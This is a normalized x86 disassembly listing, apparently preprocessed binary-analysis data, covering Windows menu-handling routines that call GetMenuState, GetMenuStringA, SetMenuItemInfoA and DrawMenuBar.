cmp al dl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40b6b8
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ ebp - 0x30 ]
and edx 0xffff9fff
or eax edx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x34 ] 0x10
lea eax [ ebp - 0x38 ]
push eax
push 0xffffffff
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
call DrawMenuBar
sub_40b2e8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffe00
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_40ba88
mov eax [ ebp - 0x8 ]
call sub_4467e8
mov [ ebp - 0x8 ] eax
push 0x400
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
mov [ ebp - 0x16 ] ax
test [ ebp - 0x16 ] 0x2
je r-xdata
test [ ebp - 0x16 ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x24
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
test [ ebp - 0x16 ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x40
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x3b
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x23
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
sub_40b3cc
push ebp
mov ebp esp
add esp 0xfffffdf8
mov [ ebp - 0x204 ] eax
mov [ ebp - 0x205 ] 0x0
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_40b2e8
pop ecx
mov [ ebp - 0x205 ] 0x1
mov eax [ ebp - 0x204 ]
add eax 0x30
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_44cd10
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x30 ]
call sub_44cf24
lea edx [ ebp - 0x200 ]
call sub_4468f8
test eax eax
je r-xdata
mov al [ ebp - 0x205 ]
mov esp ebp
pop ebp
retn
sub_40b45c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x34 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] al
mov eax [ ebp - 0x4 ]
call sub_40acdc
sub_40b488
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x24 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x35 ]
mov [ ebp - 0x6 ] al
xor eax eax
push ebp
push sub_40b4fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40bb68
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_40bb68
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_40bb68
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x35 ] dl
retn
sub_40b508
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x4 ]
call sub_40b3cc
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40b488
mov eax [ ebp - 0x4 ]
call sub_40bbc8
jmp r-xdata
sub_40b558
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov al [ ebp - 0x9 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_40b58c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4427b0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
pop ecx
pop ebp
retn
sub_40b5ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
and ax [ edx + 0x20 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_40b5f2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40acdc
sub_40b618
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_4035ec
mov eax [ ebp - 0x4 ]
call sub_40acdc
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_403654
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_44222c
sub_40b67c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4425a0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40b618
sub_40b6b8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_40b6e8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x6 ] 0x10
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemID
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSubMenu
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov cl 0x1
mov edx [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x18 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xd ] 0x0
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx + 0x24 ]
call sub_41a72c
mov [ ebp - 0xd ] al
jmp r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x4
sub_40b77c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b87e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x6 ] 0x10
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov cl 0x1
mov edx [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSubMenu
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov cl 0x1
mov edx [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_409348
cmp eax [ ebp - 0xc ]
jle r-xdata
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_409374
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov dl [ ebp + 0x8 ]
call sub_44cc88
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
mov edx [ edx + 0x24 ]
mov dl [ edx ]
call sub_44cc88
mov eax [ ebp - 0x1c ]
pop edx
call sub_4462cc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x24 ]
call sub_40c9fc
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ ebp - 0xd ] al
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b885
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_44cb04
retn
sub_40b890
push ebp
mov ebp esp
add esp 0xffffffdc
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x1c ] 0xffffffff
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x10000
jmp r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
test [ ebp - 0x1e ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x2
jne r-xdata
mov eax [ ebp - 0xc ]
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
push 0x400
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetMenuState
mov [ ebp - 0x1e ] ax
push ebp
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp - 0x1e ]
call sub_40b6e8
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x3
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
shl eax 0x10
or eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x3
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0x14 ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
test [ ebp - 0x1e ] 0x2
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
test [ ebp - 0x1e ] 0x80
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
shl eax 0x10
or eax [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
push 0x400
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetMenuState
mov [ ebp - 0x1e ] ax
push ebp
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp - 0x1e ]
call sub_40b77c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x10000
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x3
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
test [ ebp - 0x1e ] 0x80
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
sub_40ba88
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40af60
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetMenuStringA
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetMenuState
mov [ ebp - 0x16 ] ax
test [ ebp - 0x16 ] 0x10
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetMenuItemID
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x24 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4468c8
mov eax [ ebp + 0x10 ]
call sub_4467d0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0xc
sub_40bb68
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x24 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x35 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_40b21c
sub_40bb9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x35 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x35 ] al
mov eax [ ebp - 0x4 ]
call sub_40bbc8
sub_40bbc8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
call sub_428e90
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x4f ]
mov eax [ ebp - 0x4 ]
call sub_40bb68
mov eax [ ebp - 0x4 ]
mov [ eax + 0x35 ] 0x1
sub_40bc08
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
movzx eax [ eax + 0x2f ]
mov al [ eax + rw-data ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40bc2c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
mov [ edx + 0x2f ] al
pop ecx
pop ecx
pop ebp
retn
sub_40bc50
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
movzx eax [ eax + 0x30 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40bc74
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
mov [ edx + 0x30 ] al
pop ecx
pop ecx
pop ebp
retn
sub_40bc98
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4c ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
call SendMessageA
sub_40bcdc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40b5ac
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
call sub_40b3cc
mov [ ebp - 0xd ] al
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
call DrawMenuBar
sub_40bd44
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_407624
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_407624
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_40bd7c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x28 ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_407624
sub_40bdb0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x0
push 0x0
push 0xb015
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
call SendMessageA
sub_40bde8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ac58
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40be18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40be4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40be6c
push ebp
mov ebp esp
add esp 0xffffffc0
xor ecx ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c44c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c453
lea eax [ ebp - 0x40 ]
call sub_44cae0
retn
inc [ ebp - 0xc ]
dec [ ebp - 0x2c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x15 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x2c ]
jne r-xdata
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
sub eax 0x27
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
call sub_40aec0
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4259d4
jmp r-xdata
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x0
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
call sub_40ae84
test al al
jne r-xdata
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x2c ]
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_40c24e
push [ fs : eax ]
mov [ fs : eax ] esp
